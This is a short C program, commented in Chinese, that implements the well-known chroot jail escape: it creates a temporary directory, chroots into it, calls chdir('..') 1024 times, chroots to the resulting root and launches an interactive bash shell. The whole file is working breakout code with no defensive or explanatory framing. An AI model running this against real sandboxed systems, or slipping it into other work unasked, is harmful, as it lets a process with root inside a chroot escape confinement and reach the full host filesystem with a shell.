#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>  
#include <unistd.h>  
#include <sys/stat.h>  
#include <sys/types.h>  
    
#define TEMP_DIR "tmp_chroot"  
   
int main() {  
    int x;
    int done = 0;
    struct stat sbuf;
   
    /* 1. 建立一个临时目录 */
    if (stat(TEMP_DIR, &sbuf) < 0) {
        if (errno == ENOENT) {
            if (mkdir(TEMP_DIR, 0755) <0 ) {  
                fprintf(stderr, "Failed to create %s - %s\n", TEMP_DIR,
                        strerror(errno));
                exit(1);
            }
        } else {
            fprintf(stderr, "Failed to stat %s - %s\n", TEMP_DIR,
                    strerror(errno));
            exit(1);
        }
    } else if (!S_ISDIR(sbuf.st_mode)) {
        fprintf(stderr, "Error - %s is not a directory!\n", TEMP_DIR);
        exit(1);
    }

    /* 2. chroot到这个临时目录上 */
    if (chroot(TEMP_DIR) < 0) {
        fprintf(stderr, "Failed to chroot to %s - %s\n", TEMP_DIR,
                strerror(errno));
        exit(1);
    }

    /* 3. cd .. 1024次 */
    for (x = 0; x < 1024; x++) {
        chdir("..");
    }

    /* 4. chroot到当前目录 */
    chroot(".");
    
    /* 5. 启动一个新的shell */
    if (execl("/bin/bash", "-i", NULL) < 0) {
        fprintf(stderr, "Failed to exec - %s\n", strerror(errno));
        exit(1);
    }
}
